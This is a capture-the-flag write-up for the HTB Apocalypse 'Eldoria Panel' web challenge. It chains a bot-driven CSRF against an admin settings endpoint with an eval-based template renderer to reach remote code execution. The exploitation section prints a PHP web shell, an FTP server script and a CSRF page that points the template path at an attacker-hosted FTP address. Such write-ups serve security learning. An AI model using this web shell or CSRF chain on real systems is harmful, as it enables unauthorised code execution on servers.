---
title: "Eldoria Panel"
contest: "HTB Apocalypse"
category: "CTF"
difficulty: "Medium"
points: 150
tags: ["Web","CSRF", "SSTI"]
publishedAt: 2025-03-28
solved: true
---

# ***Challenge Description***

>- Challenge Author(s): 0x3d
>- A development instance of a panel related to the Eldoria simulation was found. Try to infiltrate it to reveal Malakar's secrets.
>- Difficulty: Medium



Let's start with the `login` page. First, we need register an account and log in. When logged in, we are provided the `dashboard` page. There are also several pages, but the `claim_quest` page seems most interested to us. This page allows us to input a URL, could it be vulnerable to SSRF maybe? Let's dive into the source to get better understanding. 

`/`

![EldoriaPanel Login Screen](https://raw.githubusercontent.com/Tr0x69/old-tr0x69/refs/heads/main/assets/images/htbapocalypse/image1.png)

<br>

`/dashboard`

![EldoriaPanel Login Screen](https://raw.githubusercontent.com/Tr0x69/old-tr0x69/refs/heads/main/assets/images/htbapocalypse/image.png)

<br>

`/claim_quest`

![EldoriaPanel Login Screen](https://raw.githubusercontent.com/Tr0x69/old-tr0x69/refs/heads/main/assets/images/htbapocalypse/image2.png)

<br>

Looking at the source code, there are several routes are defined, but let’s focus on the `claim quest` route.  When we claim a quest, it sends a POST request to `api/claimQuest` endpoint . 

Our input URL goes through a function called `escapeshellarg` to sanitize it and concatenated straight into a command string ($cmd) and then executed with the `exec` command.

Since the URL is sanitized, we can't exploit this with a command injection. However, the URL is passed as an argument to `bot.py`, and we also have access to the `bot.py` file. Let’s look over it.

`Routes.php`

```php
$app->post('/api/claimQuest', function (Request $request, Response $response, $args) {
	$data = json_decode($request->getBody()->getContents(), true);

	if (empty($data['questId'])) {
		$result = ['status' => 'error', 'message' => 'No quest id provided'];
	} else {
		$pdo = $this->get('db');
		$stmt = $pdo->prepare("UPDATE quests SET status = 'Claimed' WHERE id = ?");
		$stmt->execute([$data['questId']]);
		$result = ['status' => 'success', 'message' => 'Quest claimed'];
	}

	$response->getBody()->write(json_encode($result));
	$response = $response->withHeader('Content-Type', 'application/json');

[...]

	if (!empty($data['questUrl'])) {
        $validatedUrl = filter_var($data['questUrl'], FILTER_VALIDATE_URL);
        if ($validatedUrl === false) {
            error_log('Invalid questUrl provided: ' . $data['questUrl']);
        } else {
            $safeQuestUrl = escapeshellarg($validatedUrl);
            $cmd = "nohup python3 " . escapeshellarg(__DIR__ . "/bot/run_bot.py") . " " . $safeQuestUrl . " > /dev/null 2>&1 &";
            exec($cmd);
        }
    }


```
<br>

This bot uses selenium to start a headless browser  and automate the process of logging in as an admin by fetching from the database. After logging in with admin user, it then send a get request to our URL. 

Since there are no control over the content of  our URL provided, we can perform a CSRF attack using the admin account.  However, what action is helpful for us?

`bot.py`


```python
import sys
import time
import sqlite3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

def main():
	if len(sys.argv) < 2:
		print("No quest URL provided.", file=sys.stderr)
		sys.exit(1)
	quest_url = sys.argv[1]

	DB_PATH = "/app/data/database.sqlite"

	conn = sqlite3.connect(DB_PATH)
	c = conn.cursor()
    [...]

	c.execute("SELECT username, password FROM users WHERE is_admin = 1 LIMIT 1")
	admin = c.fetchone()
	if not admin:
		print("Admin not found in the database.", file=sys.stderr)
		sys.exit(1)

	admin_username, admin_password = admin

	chrome_options = Options()

	chrome_options.add_argument("headless")
	chrome_options.add_argument("no-sandbox")
	chrome_options.add_argument("disable-dev-shm-usage")
    chrome_options.add_argument("disable-background-networking")
    [...]

	driver = webdriver.Chrome(options=chrome_options)

	try:
		driver.get("http://127.0.0.1:9000")

		username_field = driver.find_element(By.ID, "username")
		password_field = driver.find_element(By.ID, "password")

		username_field.send_keys(admin_username)
		password_field.send_keys(admin_password)

		submit_button = driver.find_element(By.ID, "submitBtn")
		submit_button.click()

		driver.get(quest_url)

		time.sleep(5)

if __name__ == "__main__":
	main()
```

<br>

Looking at how the application work, it uses the `render` function to display pages. This function receives a file path and checks if the file exists. If it does, it fetches the content of the file using `file_get_contents`, then use `eval` to execute the content as PHP code. This could make the application vulnerable to file inclusion if we somehow could control the contents.


`Routes.php`

```php

function render($filePath) {
    if (!file_exists($filePath)) {
        return "Error: File not found.";
    }
    $phpCode = file_get_contents(filename: $filePath);
    ob_start();
    eval("?>" . $phpCode);
    return ob_get_clean();
}

$app->get('/', function (Request $request, Response $response, $args) {
    $html = render(filePath: $GLOBALS['settings']['templatesPath'] . '/login.php');
    $response->getBody()->write($html);
    return $response;
});
```

<br>

The application also has an endpoint `/api/admin/appSettings`, which allows for updating app settings like the `template_path` through a POST request as admin. We can use the bot earlier to trigger a CSRF to change the template path.

Once we gain control of the `template_path`, we can bypass the `file_exists` check by using FTP. This allows us to manipulate the content of the template file, leading to RCE. 

`Routes.php`


```php
$app->post('/api/admin/appSettings', function (Request $request, Response $response, $args) {
	$data = json_decode($request->getBody()->getContents(), true);
	if (empty($data) || !is_array($data)) {
		$result = ['status' => 'error', 'message' => 'No settings provided'];
	} else {
		$pdo = $this->get('db');
		$stmt = $pdo->prepare("INSERT INTO app_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value");
		foreach ($data as $key => $value) {
			$stmt->execute([$key, $value]);
		}
		if (isset($data['template_path'])) {
			$GLOBALS['settings']['templatesPath'] = $data['template_path'];
		}
		$result = ['status' => 'success', 'message' => 'Settings updated'];
	}
	$response->getBody()->write(json_encode($result));
	return $response->withHeader('Content-Type', 'application/json');
})->add($adminApiKeyMiddleware);

//We can perform this action without needing the admin account due flawed logic of this endpoint
```
<br>

# ***Exploitation***

Set up an FTP server and create a malicious file with the same name as one of the template files used by the application.

[https://pypi.org/project/pyftpdlib/](https://pypi.org/project/pyftpdlib/)

```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

def main():
    authorizer = DummyAuthorizer()
    authorizer.add_user("test", "test", homedir=".", perm="elradfmwMT")

    handler = FTPHandler
    handler.authorizer = authorizer

    address = ("", 2121)
    server = FTPServer(address, handler)

    print(f"FTP server started on {address[0] or 'localhost'}:{address[1]}")
    server.serve_forever()

if __name__ == "__main__":
    main()
```

 <br>

`login.php`

```php
<?php echo system($_GET['cmd']); ?>
```
<br>

Then host a malicious file that change the template path to the file that we host on FTP server. Once the bot click, it then change the path, and connect to FTP server to download the malicious `login.php`. 

`test.html`

```jsx
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit - Update Template Path</title>
</head>
<body>
    <h1>Updating settings, please wait...</h1>
    <script>
        fetch("http://127.0.0.1:9000/api/admin/appSettings", {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({"template_path": "ftp://test:test@{ip}:2121"})
        });
    </script>
</body>
</html>

```



<br>

![setupngrok](https://raw.githubusercontent.com/Tr0x69/old-tr0x69/refs/heads/main/assets/images/htbapocalypse/image3.png)

<br>

![sendpost](https://raw.githubusercontent.com/Tr0x69/old-tr0x69/refs/heads/main/assets/images/htbapocalypse/image4.png)


<br>

![flag](https://raw.githubusercontent.com/Tr0x69/old-tr0x69/refs/heads/main/assets/images/htbapocalypse/image5.png)